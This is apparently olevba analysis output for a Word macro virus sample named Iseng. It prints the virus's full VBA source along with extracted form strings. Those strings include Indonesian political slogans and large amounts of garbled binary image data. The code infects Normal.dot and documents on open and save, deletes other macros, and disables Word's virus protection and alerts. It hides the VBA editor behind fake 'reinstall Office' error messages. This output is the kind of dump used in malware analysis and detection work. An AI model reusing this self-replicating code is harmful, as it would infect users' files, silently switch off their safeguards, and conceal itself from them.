olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Iseng
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Iseng - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Iseng.bas 
in file: ./Virus.MSWord.Iseng - OLE stream: 'Macros/VBA/Iseng'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public A
Public R
Public T
Public Const X = "Please reinstall your Microsoft Office Program"
Public Const V = "Visual Basic"
Public Const W = "Iseng"
Public Const Y = "Isengf"
Public Const Z = "ThisDocument"
Public Const O = "Macro"
Public Const E = " Editor Error"
Function gmm(I, D)
 On Error GoTo S
 gmm = D.VBProject.VBComponents(I).Name
S:
End Function
Sub Fa(I)
 f = Options.DefaultFilePath(Path:=2) & "\Normal.dot"
 On Error GoTo S
 T = GetAttr(f)
 On Error GoTo S
 SetAttr f, I
S:
End Sub
Sub CM(A, T, N)
On Error GoTo S
 Application.OrganizerCopy Source:=A.FullName, Destination:=T.FullName, Name:=N, Object:=3
S:
End Sub
Function CD(D)
 CD = 0
 For I = 1 To D.VBProject.VBComponents.Count
  If gmm(I, D) = W Then
   CD = 1
  End If
 Next I
End Function
Sub CA(D)
 For I = 1 To D.VBProject.VBComponents.Count
  nm = D.VBProject.VBComponents(I).Name
  If (nm <> Z) And (nm <> W) And (nm <> Y) Then
   On Error GoTo S
   Application.OrganizerDelete Source:=D.FullName, Name:=nm, Object:=3
  End If
 Next I
S:
End Sub
Sub DP(X)
 Fa (32)
 With Options
  .VirusProtection = False
  .SaveNormalPrompt = False
 End With
End Sub
Sub Init(X)
 A = Application.DisplayAlerts
 Application.DisplayAlerts = 0
 Call DP(1)
 WordBasic.DisableAutoMacros 0
 With CommandBars(V)
  .Visible = False
  .Enabled = False
  .Protection = 8
  .Protection = 1
 End With
 On Error Resume Next
 CommandBars("Tools").Controls(O).Delete
 CustomizationContext = NormalTemplate
 On Error GoTo 0
End Sub
Sub Bb(X)
 On Error GoTo S
 Application.DisplayAlerts = A
S:
End Sub
Sub Hh(X)
 Call Init(1)
 On Error GoTo S
 NU = CD(NormalTemplate)
 On Error GoTo S
 DU = CD(ActiveDocument)
 If NU = 0 Then
  Call CA(NormalTemplate)
  If DU = 1 Then
   Call CM(ActiveDocument, NormalTemplate, W)
   Call CM(ActiveDocument, NormalTemplate, Y)
  End If
 Else
  If DU = 0 Then
   Call CA(ActiveDocument)
   Call CM(NormalTemplate, ActiveDocument, W)
   Call CM(NormalTemplate, ActiveDocument, Y)
   R = 1
  End If
 End If
S:
 Call Bb(1)
End Sub
Sub Si(X)
 If R = 1 Then
  On Error GoTo S
  ActiveDocument.SaveAs FileName:=ActiveDocument.Name, FileFormat:=0
 End If
S:
End Sub
Sub AutoOpen()
 Call Hh(1)
End Sub
Sub FileClose()
On Error GoTo S
 WordBasic.FileClose
S:
End Sub
Sub FileOpen()
 Dialogs(80).Show
 Call Hh(1)
 Call Si(1)
 Call Bb(1)
End Sub
Sub FileSaveAs()
 Call Hh(1)
 Call Bb(1)
 Dialogs(84).Show
End Sub
Sub FileSave()
 Call Hh(1)
 Call Si(1)
End Sub
Sub HelpAbout()
 On Error GoTo S
 Dialogs(9).Show
 On Error GoTo S
 Isengf.Show
S:
End Sub
Sub FileExit()
 WordBasic.FileExit
End Sub
Sub ToolsOptions()
 Dialogs(974).Show
 Call DP(1)
 On Error GoTo S
 Isengf.Show
S:
End Sub
Sub FileTemplates()
 Call Hh(I)
End Sub
Sub ToolsMacro()
 MsgBox X, 0, O & E
End Sub
Sub ViewVBCode()
    MsgBox X, 0, V & E
End Sub
-------------------------------------------------------------------------------
VBA MACRO Isengf.frm 
in file: ./Virus.MSWord.Iseng - OLE stream: 'Macros/VBA/Isengf'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
































Private Sub Okay_Click()
  Hide
End Sub
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ingat Bung Jaga Persatuan Dan Kesatuan Bangsa����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Reformasi Bukan Hanya Untuk Kami, Tapi Untuk Semuaa
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Jangan Hanya Jadi Penonton Jadilah Pelakungs�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dan Bukan Untuk Hari Ini Saja, Tapi Untuk Selamanya
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Salam Perjuangan ............ Merdeka !!!!!!�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
GIF89aD
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������ֽ询�����s�hL�`H��)ƌ!�\!�4$�)
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�I(y!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
h5,V71sR
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
gff��k
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
NETSCAPE2.0
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�`'"
"�h��l���h�k߸�03���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���(�Ȥj
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8l6�h�ixJ�?�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�}i1�0K���͏t�Ri7
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J"!Α!�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�a��+
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
k~if�����h
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����r9
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�x{|��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����z
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���ê�	5(�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�~l�����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
|����܈�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)��x�i�����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����ܢ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`ɰ��k�y�v5�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�U�*�C1�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���B����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�G��[��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�93W�Z@w�.��&l#!>-��1
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1� ��,�;�қ�p-b��y
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�5��"�l�𣊆Si��j-'Fi=�u|�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
lX�c��W*�F�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
֌I�XIe��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
|�ִ�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[]�,s]�p#1&�Q��������*W�Ӡ4�cs
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(�PMi�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8pP��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�^�ܶ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�<�`@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�΍ �
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
U��.o��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�'N�8y��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�0Nx����\��E��l
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
u�ɷW%�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H���%�!~�%��z
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
q�m�bsĥ�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�3�V���Y
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Վ=r�_��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�H���5�!� �'f�VR'�uhf�erb���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�H��)�'��i"���B���y��$v�ڹb�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�'��D�x�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
a���W
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N�d�_R�'��9��$�"
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*�-"ʟsΨL
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)�cr��w�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����b����P�:�lC�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
JKm�uPr@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�f[I�b\
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�`'"
"�h��l���h�k߸�03���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���(�Ȥj
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8l6�h�ixJ�?�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�}i3�0�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
x����C"
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
pJdvu
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������7
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
e����}������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������©��(
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��v����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��۟Ǯg���~����գ�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��̴��栲�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��	d�"�×�A�i�x=��I�@O
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-�@X/�8ge�Q#��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��a��mY�q��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���ɋ�B=���㝗�BF
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)�"@��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
M\��=�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
AI%ɒM��2�����$�SA��x��&�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
W2���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�"�V���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Vn:yne�lҳ���X-e6�@�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\p�K��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�TK���V��o���	�ˁ�
Q�~���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
n�0��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�kCRˌʀခ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0��@rܹ�K߽�ɓ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�7�f߾��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
X�	}��]�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����_z�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��v��w�m
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$�Ă��g!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
]��=a@�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
n�Ќ**�_r�Y
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
dvCJwc�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ؐ�r<2y�{��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
tV��#�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
6)��2

-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���� r9!�_
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)#{G��`
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>q��}�)gtHf��x���xr
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���&y
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
d@h�[&*
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Gv��)�]��`��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Y�	 s�����ex��v�
"n�.
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9p$,�rp
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N+G+�Z
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�<�z�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�`'"
"�h��l���h�k߸�03���
-------------------------------------------------------------------------------
